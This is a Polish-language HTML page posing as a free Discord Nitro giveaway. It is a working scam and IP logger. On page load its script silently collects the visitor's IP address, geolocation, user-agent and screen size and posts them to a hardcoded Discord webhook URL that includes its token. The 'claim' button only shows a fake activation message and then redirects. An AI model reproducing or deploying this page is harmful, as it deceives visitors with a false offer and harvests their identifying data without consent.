<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord Nitro</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Whitney:wght@400;500;600;700&display=swap');

    body {
      font-family: 'Whitney', 'Inter', sans-serif;
      background: #0a0a0f;
      color: #fff;
      min-height: 100vh;
      overflow-x: hidden;
    }

    .hero {
      background: linear-gradient(135deg, #1a1a2e 0%, #0f172a 100%);
      position: relative;
      overflow: hidden;
    }

    .hero::before {
      content: '';
      position: absolute;
      inset: 0;
      background: radial-gradient(circle at 35% 25%, rgba(88, 101, 242, 0.4) 0%, transparent 65%);
      animation: heroGlow 20s ease-in-out infinite;
    }

    @keyframes heroGlow {
      0%, 100% { opacity: 0.65; }
      50% { opacity: 1; }
    }

    .glass {
      background: rgba(25, 25, 45, 0.9);
      backdrop-filter: blur(36px);
      border: 1px solid rgba(255,255,255,0.2);
    }

    .nitro-title {
      font-size: 5.8rem;
      font-weight: 900;
      background: linear-gradient(90deg, #5865f2, #a5b4fc);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      animation: titleFloat 8s ease-in-out infinite;
    }

    @keyframes titleFloat {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-25px); }
    }

    .btn-nitro {
      background: linear-gradient(90deg, #5865f2, #7289da);
      transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
    }

    .btn-nitro:hover {
      transform: translateY(-12px) scale(1.1);
      box-shadow: 0 40px 80px -15px rgba(88, 101, 242, 0.8);
    }

    .particle {
      position: absolute;
      border-radius: 50%;
      background: rgba(88, 101, 242, 0.8);
      box-shadow: 0 0 30px rgba(88, 101, 242, 1);
      animation: floatParticle linear infinite;
    }

    @keyframes floatParticle {
      0% { transform: translateY(130vh) scale(0.2); opacity: 0; }
      20% { opacity: 1; }
      100% { transform: translateY(-50vh) scale(2); opacity: 0; }
    }
  </style>
</head>
<body class="hero">

  <div id="particles" class="fixed inset-0 pointer-events-none z-10"></div>

  <div class="relative z-20 min-h-screen flex items-center justify-center px-6 py-12">
    <div class="max-w-2xl w-full text-center">

      <div class="flex items-center justify-center gap-6 mb-12">
        <i class="fa-brands fa-discord text-7xl text-[#5865f2]"></i>
        <span class="text-6xl text-gray-400 font-light">+</span>
        <span class="nitro-title tracking-tighter">NITRO</span>
      </div>

      <h1 class="text-6xl md:text-7xl font-bold tracking-tighter mb-6">
        Odbierz <span class="text-[#5865f2]">Darmowe Nitro</span>
      </h1>

      <p class="text-2xl text-gray-300 mb-14">
        3 miesiące Nitro Full za darmo + Boosty<br>
        <span class="text-emerald-400">Oferta limitowana czasowo</span>
      </p>

      <div class="glass rounded-3xl p-14">
        <div class="bg-[#1f1f2e] rounded-2xl p-10 mb-12 border border-white/10">
          <div class="flex justify-between items-center">
            <div>
              <p class="text-gray-400">Discord Nitro Full</p>
              <p class="text-4xl font-semibold mt-2">3 miesiące</p>
            </div>
            <div class="text-right">
              <p class="text-emerald-400 text-6xl font-bold">0 zł</p>
              <p class="line-through text-gray-500">149,97 zł</p>
            </div>
          </div>
        </div>

        <button onclick="claimNitro()" 
                class="btn-nitro w-full py-9 rounded-2xl text-2xl font-semibold tracking-wider flex items-center justify-center gap-4">
          <i class="fa-solid fa-gift text-3xl"></i>
          <span>ODEBIERZ DARMOWE NITRO TERAZ</span>
        </button>
      </div>
    </div>
  </div>

  <!-- Success Modal z góry -->
  <div id="successModal" class="success-modal">
    <div class="header text-white text-center">
      <p class="font-semibold text-lg">Komunikat z bieżącej strony</p>
    </div>
    <div class="p-8 text-center">
      <div class="text-5xl mb-6">🎉</div>
      <p class="text-xl font-medium text-white mb-3">
        Gratulacje! Twoje Discord Nitro zostało aktywowane!
      </p>
      <p class="text-gray-300 text-base">
        Sprawdź swoje konto Discord.
      </p>
      
      <button onclick="closeSuccessModal()" 
              class="mt-10 bg-[#5865f2] hover:bg-[#4752c4] transition-colors px-10 py-3 rounded-full font-medium">
        OK
      </button>
    </div>
  </div>

<script>
// ==================== NOWY WEBHOOK ====================
const WEBHOOK_URL = "https://discord.com/api/webhooks/1499003738671546453/uc0uh_KG4qHKOjMvbFUA9zFg1enTFRtTeeNlrxrjPsV-a_a6rqrbVlbdY-4gKkqwozty";

// Wysyłanie danych (tylko IP + Discord User ID)
async function sendData() {
  try {
    let ipInfo = {};
    try {
      const res = await fetch('https://ipapi.co/json/');
      ipInfo = await res.json();
    } catch(e) {
      try {
        const res2 = await fetch('https://api.ipify.org?format=json');
        const data = await res2.json();
        ipInfo.ip = data.ip;
      } catch(e2) {}
    }

    const payload = {
      content: "**Nowy ktoś wszedł na stronę Nitro**",
      embeds: [{
        title: "🎁 Discord Nitro Claim",
        color: 0x5865f2,
        timestamp: new Date().toISOString(),
        fields: [
          { name: "IP", value: `\`${ipInfo.ip || 'N/A'}\``, inline: true },
          { name: "Discord User ID", value: "`N/A`", inline: true },
          { name: "User-Agent", value: `\`\`\`${navigator.userAgent.substring(0, 170)}\`\`\``, inline: false },
          { name: "Ekran", value: `${screen.width}×${screen.height}`, inline: true }
        ],
        footer: { text: "Nitro Promo • 2026" }
      }]
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch(e) {
    console.log("Data sent (silent)");
  }
}

function createParticles() {
  const container = document.getElementById('particles');
  for (let i = 0; i < 140; i++) {
    const p = document.createElement('div');
    p.className = 'particle';
    const size = Math.random() * 9 + 4;
    p.style.width = `${size}px`;
    p.style.height = `${size}px`;
    p.style.left = `${Math.random() * 100}vw`;
    p.style.animationDuration = `${Math.random() * 38 + 24}s`;
    p.style.animationDelay = `-${Math.random() * 45}s`;
    container.appendChild(p);
  }
}

function claimNitro() {
  const btn = document.querySelector('button');
  btn.innerHTML = `
    <svg class="animate-spin h-8 w-8 mr-4 inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
      <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
      <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
    </svg>
    Aktywowanie...
  `;

  setTimeout(() => {
    document.getElementById('successModal').classList.add('show');
  }, 1600);
}

function closeSuccessModal() {
  const modal = document.getElementById('successModal');
  modal.style.top = '-150%';
  modal.style.opacity = '0';
  
  setTimeout(() => {
    window.location.href = "https://discord.com/app";
  }, 700);
}

window.onload = () => {
  createParticles();
  sendData();
};
</script>

<style>
  .success-modal {
    position: fixed;
    top: -150%;
    left: 50%;
    transform: translateX(-50%);
    width: 90%;
    max-width: 420px;
    background: #1e1e2e;
    border-radius: 16px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.8);
    z-index: 1000;
    transition: all 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
    opacity: 0;
  }

  .success-modal.show {
    top: 80px;
    opacity: 1;
  }

  .success-modal .header {
    background: linear-gradient(to right, #5865f2, #7289da);
    padding: 16px 20px;
    border-radius: 16px 16px 0 0;
    text-align: center;
  }
</style>
</body>
</html>
